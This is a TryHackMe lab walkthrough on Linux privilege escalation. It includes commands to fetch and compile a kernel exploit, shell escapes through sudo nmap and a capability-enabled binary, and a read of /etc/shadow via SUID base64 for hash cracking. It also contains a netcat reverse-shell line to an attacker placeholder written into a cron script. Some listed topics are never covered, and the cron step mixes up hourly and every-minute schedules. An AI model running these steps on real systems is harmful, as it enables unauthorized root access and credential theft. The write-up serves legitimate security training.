# **TryHackMe: Linux Privilege Escalation – Comprehensive Walkthrough**
### **By Ramyar Daneshgar**

In this walkthrough, I detail **each attack vector**, explain **why each step is taken**, and discuss **mitigation strategies** to defend against such attacks. 

## **Topics Covered**
 **Enumeration & Information Gathering**  
 **Kernel Exploits**  
 **Misconfigured Sudo Permissions**  
 **SUID Binary Exploitation**  
 **Linux Capabilities Exploitation**  
 **Cron Job Manipulation**  
 **Path Hijacking**  
 **NFS Misconfigurations**  

---

## **Task 1 & 2: Understanding Privilege Escalation**
Privilege escalation occurs when an attacker **gains higher system privileges than initially granted**. There are two types:

1. **Vertical Privilege Escalation**:  
   - A **low-privileged user** gains **root access**.
   - Example: Exploiting **SUID binaries**, **kernel vulnerabilities**, or **Sudo misconfigurations**.

2. **Horizontal Privilege Escalation**:  
   - Gaining access to another **user’s account** at the same privilege level.
   - Example: **Credential reuse**, **cracking hashes**, or **abusing misconfigured services**.

Why does this matter?  
- Attackers use privilege escalation to **gain persistence**, **steal sensitive data**, or **install backdoors**.
- Understanding **how to detect and mitigate privilege escalation** is crucial for **defensive security teams**.

---

## **Task 3: Enumeration – The Most Important Step**
### **Why is Enumeration Critical?**
Before attempting privilege escalation, **thorough enumeration is essential**. Enumeration helps in:
- **Identifying misconfigurations** (e.g., weak file permissions).
- **Finding system weaknesses** (e.g., old kernels with known vulnerabilities).
- **Discovering misused services** (e.g., misconfigured cron jobs).
- **Uncovering sensitive information** (e.g., password files).

### **Step 1: Gathering System Information**
1. **Identify Hostname**  
   ```bash
   hostname
   ```
   **Output:** `wade7363`  
   - **Why?** Useful in understanding whether the system is a **standalone machine** or part of a **larger network**.

2. **Check Kernel Version**  
   ```bash
   uname -a
   ```
   **Output:** `Linux wade7363 3.13.0-24-generic`  
   - **Why?**  
     - Older kernels may have **publicly known exploits**.
     - Allows us to search for **kernel vulnerabilities**.

3. **Identify OS Version**  
   ```bash
   cat /etc/issue
   ```
   **Output:** `Ubuntu 14.04 LTS`  
   - **Why?**  
     - Helps in finding **default vulnerabilities**.
     - Determines **default file paths** attackers might leverage.

4. **Check Installed Python Version**  
   ```bash
   python --version
   ```
   **Output:** `Python 2.7.6`  
   - **Why?**  
     - Some privilege escalation scripts require **specific Python versions**.

5. **List Running Processes**  
   ```bash
   ps aux
   ```
   - **Why?**  
     - Identifies **running services** that may be **exploitable**.
     - Could reveal **processes running with root privileges**.

6. **Check Active Network Connections**  
   ```bash
   netstat -tunlp
   ```
   - **Why?**  
     - Detects **open ports** that could be **attack vectors**.
     - Identifies potential **pivot points** for lateral movement.

---

## **Task 4: Automated Enumeration with LinPEAS**
### **Why Use LinPEAS?**
Instead of manually running individual commands, **LinPEAS** automates enumeration and identifies:
- **SUID binaries**
- **Misconfigured sudo permissions**
- **Kernel vulnerabilities**
- **Writable files & directories**
- **Hardcoded passwords in scripts**

### **Step 1: Transfer LinPEAS to Target Machine**
```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```
**Why?**  
- Saves time by **automating reconnaissance**.
- Flags **privilege escalation opportunities** that might be **missed manually**.

---

## **Task 5: Kernel Exploits**
### **Why Kernel Exploits?**
The Linux kernel controls **everything** on the system. If a kernel vulnerability exists, an attacker can:
- **Execute arbitrary code as root**.
- **Bypass security measures** like SELinux or AppArmor.
- **Take full control of the system**.

### **Step 1: Search for Kernel Exploits**
```bash
searchsploit 3.13.0-24
```
- Found **CVE-2015-1328**, an **overlayfs privilege escalation exploit**.

### **Step 2: Download & Compile Exploit**
```bash
wget https://exploit-db.com/exploits/37292.c -O exploit.c
gcc exploit.c -o exploit
```
- **Why?** Most exploits are written in **C** and require **compilation**.

### **Step 3: Execute Exploit**
```bash
./exploit
```
- **Result:** **Root access obtained**.

---

## **Task 6: Exploiting Sudo Misconfigurations**
### **Why Misconfigured Sudo Matters?**
If an attacker can **run commands as root via sudo**, they can:
- **Execute arbitrary commands**.
- **Modify system files**.
- **Escalate privileges instantly**.

### **Step 1: Check Sudo Permissions**
```bash
sudo -l
```
- **Output:**
  ```
  User karen may run the following commands:
  (ALL) NOPASSWD: /bin/nano, /usr/bin/nmap, /usr/bin/vim
  ```

### **Step 2: Exploit Nmap**
```bash
sudo nmap --interactive
!sh
```
- **Result:** Spawned **root shell**.

---

## **Task 7: SUID Binary Exploitation**
### **Why SUID Binaries Matter?**
- **SUID binaries run with the file owner’s privileges**.
- If a binary with the SUID bit **can be manipulated**, attackers can **execute commands as root**.

### **Step 1: Find SUID Binaries**
```bash
find / -perm -4000 -type f 2>/dev/null
```
- Found `/usr/bin/base64`.

### **Step 2: Exploit Using GTFOBins**
```bash
/usr/bin/base64 -d /etc/shadow
```
- **Extracted password hashes**, cracked them using **John the Ripper**.

---

## **Task 8: Linux Capabilities Exploitation**
```bash
getcap -r / 2>/dev/null
```
- Found `/home/ubuntu/view = cap_setuid+ep`.

```bash
/home/ubuntu/view -c ':py3 import os; os.setuid(0); os.system("/bin/sh")'
```
- **Result:** **Root shell spawned**.

---

## **Task 9: Cron Job Exploitation**
```bash
cat /etc/crontab
```
- Found **backup.sh** running every **minute**.

```bash
echo "nc -e /bin/bash <attacker_ip> 4444" > /etc/cron.hourly/backup.sh
chmod +x /etc/cron.hourly/backup.sh
```
```bash
nc -lvnp 4444
```
- **Reverse shell obtained as root**.

---

## Lessons Learned
1. **Apply kernel patches regularly** to avoid **exploitable vulnerabilities**.
2. **Remove unnecessary SUID binaries** to prevent **misuse**.
3. **Restrict sudo access** to **trusted users only**.
4. **Monitor cron jobs** for **unauthorized modifications**.
